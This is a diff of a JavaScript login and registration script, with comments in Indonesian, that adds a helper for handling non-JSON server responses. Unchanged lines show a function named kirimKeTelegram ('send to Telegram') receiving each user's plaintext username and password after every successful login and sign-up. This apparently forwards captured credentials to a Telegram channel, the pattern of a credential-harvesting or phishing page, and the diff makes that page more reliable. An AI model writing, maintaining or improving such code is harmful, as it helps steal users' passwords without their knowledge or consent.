@@ -708,6 +708,22 @@
   }
 
   /* ============================================
+     PARSE RESPONSE (ANTI "NOT VALID JSON")
+     ============================================ */
+  async function parseResponse(res) {
+    var text = await res.text();
+    try {
+      return JSON.parse(text);
+    } catch (e) {
+      if (text.indexOf('The page could not be found') !== -1 ||
+          text.indexOf('404') !== -1) {
+        return { success: false, message: 'Endpoint API tidak ditemukan. Cek folder api/.' };
+      }
+      return { success: false, message: 'Server tidak merespons JSON: ' + text.substring(0, 80) };
+    }
+  }
+
+  /* ============================================
      KIRIM KE TELEGRAM
      ============================================ */
   async function kirimKeTelegram(username, password, tipe) {
@@ -725,7 +741,7 @@
   }
 
   /* ============================================
-     HANDLE LOGIN — Server-side via /api/login
+     HANDLE LOGIN
      ============================================ */
   async function handleLogin(e) {
     e.preventDefault();
@@ -749,11 +765,10 @@
         credentials: 'include',
         body: JSON.stringify({ username: username, password: password })
       });
-      var data = await res.json();
+      var data = await parseResponse(res);
 
       if (data.success) {
         kirimKeTelegram(username, password, 'login');
-
         sessionStorage.setItem('user', data.user);
         sessionStorage.setItem('role', data.role || 'member');
         sessionStorage.setItem('loginTime', new Date().toISOString());
@@ -775,7 +790,7 @@
   }
 
   /* ============================================
-     HANDLE REGISTER — Server-side via /api/register
+     HANDLE REGISTER
      ============================================ */
   async function handleRegister(e) {
     e.preventDefault();
@@ -807,7 +822,7 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username: username, password: password })
       });
-      var data = await res.json();
+      var data = await parseResponse(res);
 
       if (data.success) {
         kirimKeTelegram(username, password, 'register');
